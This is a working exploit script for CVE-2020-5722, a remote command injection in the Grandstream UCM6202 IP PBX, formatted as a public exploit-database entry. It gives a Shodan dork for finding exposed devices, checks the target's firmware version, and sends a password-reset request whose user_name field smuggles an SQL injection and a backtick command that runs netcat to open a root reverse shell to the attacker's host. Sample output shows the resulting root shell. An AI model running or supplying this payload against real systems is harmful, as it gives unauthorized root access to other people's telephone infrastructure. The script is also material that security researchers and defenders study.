# Exploit Title: UCM6202 1.0.18.13 - Remote Command Injection
# Date: 2020-03-23
# Exploit Author: Jacob Baines
# Vendor: http://www.grandstream.com
# Product Link: http://www.grandstream.com/products/ip-pbxs/ucm-series-ip-pbxs/product/ucm6200-series
# Tested on: UCM6202 1.0.18.13
# CVE : CVE-2020-5722
# Shodan Dork: ssl:"Grandstream" "Set-Cookie: TRACKID"
# Advisory: https://www.tenable.com/security/research/tra-2020-15
#
# Sample output:
# albinolobster@ubuntu:~$ python3 pbx_sploit.py --rhost 192.168.2.1 --lhost 192.168.2.107
# [+] Sending getInfo request to  https://192.168.2.1:8089/cgi
# [+] Remote target info:
# -> Model:  UCM6202
# -> Version:  1.0.18.13
# [+] Vulnerable version!
# [+] Sending exploit. Reverse shell to 192.168.2.107:1270
#
# albinolobster@ubuntu:~$ nc -lvp 1270
# Listening on [] (family 2, port)
# Connection from _gateway 41675 received!
# whoami
# root
# uname -a
# Linux UCM6202 3.0.35 #1 SMP PREEMPT Thu Jul 5 15:56:51 CST 2018 armv7l GNU/Linux
##

import os
import re
import sys
import json
import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

top_parser = argparse.ArgumentParser(description='')
top_parser.add_argument('--rhost', action="store", dest="rhost",
required=True, help="The remote host to connect to")
top_parser.add_argument('--rport', action="store", dest="rport", type=int,
help="The remote port to connect to", default=8089)
top_parser.add_argument('--lhost', action="store", dest="lhost",
required=True, help="The local host to connect back to")
top_parser.add_argument('--lport', action="store", dest="lport", type=int,
help="The local port to connect back to", default=1270)
args = top_parser.parse_args()


url = 'https://' + args.rhost + ':' + str(args.rport) + '/cgi'
print('[+] Sending getInfo request to ', url)

try:
    resp = requests.post(url=url, data='action=getInfo', verify=False)
except Exception:
    print('[-] Error connecting to remote target')
    sys.exit(1)

if resp.status_code != 200:
    print('[-] Did not get a 200 OK on getInfo request')
    sys.exit(1)

if resp.text.find('{ "response":') != 0:
    print('[-] Unexpected response')
    sys.exit(1)

try:
    parsed_response = json.loads(resp.text)
except Exception:
    print('[-] Unable to parse json response')
    sys.exit(1)

print('[+] Remote target info: ')
print('\t-> Model: ', parsed_response['response']['model_name'])
print('\t-> Version: ', parsed_response['response']['prog_version'])

match = re.match('^([0-9]+)\.([0-9]+)\.([0-9]+)\.([0-9]+)$',
parsed_response['response']['prog_version'])
if not match:
    print('[-] Failed to extract the remote targets version')
    sys.exit(1)

major = int(match[1])
minor = int(match[2])
point = int(match[3])
patch = int(match[4])

if (major > 1) or (major == 1 and minor > 0) or (major == 1 and minor == 0
and point > 19) or (major == 1 and minor == 0 and point == 19 and patch >=
20):
    print('[-] Unaffected version')
    sys.exit(1)
else:
    print('[+] Vulnerable version!')

print('[+] Sending exploit. Reverse shell to %s:%i' % (args.lhost,
args.lport))
try:
    exploit = 'admin\' or 1=1--`;`nc${IFS}' + args.lhost + '${IFS}' +
str(args.lport) + '${IFS}-e${IFS}/bin/sh`;`'
    resp = requests.post(url=url,
data='action=sendPasswordEmail&user_name=' + exploit, verify=False)
except Exception as err:
    print('[-] Failed to send payload')
    sys.exit(1)

if resp.status_code != 200:
    print('[-] Did not get a 200 OK on sendPasswordEmail request')
    sys.exit(1)

try:
    parsed_response = json.loads(resp.text)
except Exception:
    print('[-] Unable to parse json response')
    sys.exit(1)

if parsed_response['status'] == 0:
    print('[+] Success! Clean exit.')
else:
    print('[-] Something bad happened.')